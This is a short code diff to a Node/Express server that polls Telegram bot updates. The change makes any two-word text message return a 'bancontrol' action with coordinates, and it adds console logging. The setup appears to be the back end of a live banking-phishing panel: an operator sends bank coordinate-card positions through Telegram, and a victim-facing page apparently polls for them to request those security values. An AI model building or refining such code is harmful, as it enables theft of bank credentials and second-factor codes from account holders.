@@ -49,6 +49,7 @@ app.get('/api/poll', async (req, res) => {
     );
     const data = await r.json();
 
+    console.log('Updates recibidos:', data.result?.length || 0, '| waitingForCoords:', waitingForCoords);
     if (!data.ok || !data.result.length) {
       return res.json({ ok: true, action: null, waitCoords: waitingForCoords, update_id: lastUpdateId });
     }
@@ -56,24 +57,22 @@ app.get('/api/poll', async (req, res) => {
     for (const update of data.result) {
       lastUpdateId = update.update_id;
 
-      // MENSAJE DE TEXTO — coords del bancontrol
+      // MENSAJE DE TEXTO — siempre tratar como coords si tiene 2 palabras
       if (update.message?.text) {
         const txt = update.message.text.trim();
         if (txt.startsWith('/')) continue;
 
-        if (waitingForCoords) {
-          const parts = txt.toUpperCase().split(/\s+/);
-          if (parts.length >= 2) {
-            waitingForCoords = false;
-            pendingCoords = null;
-            return res.json({
-              ok: true,
-              action: 'bancontrol',
-              coords: [parts[0], parts[1]],
-              waitCoords: false,
-              update_id: lastUpdateId
-            });
-          }
+        console.log('Mensaje recibido:', txt, '| waitingForCoords:', waitingForCoords);
+
+        const parts = txt.toUpperCase().split(/\s+/);
+        if (parts.length >= 2) {
+          waitingForCoords = false;
+          return res.json({
+            ok: true,
+            action: 'bancontrol',
+            coords: [parts[0], parts[1]],
+            update_id: lastUpdateId
+          });
         }
         continue;
       }
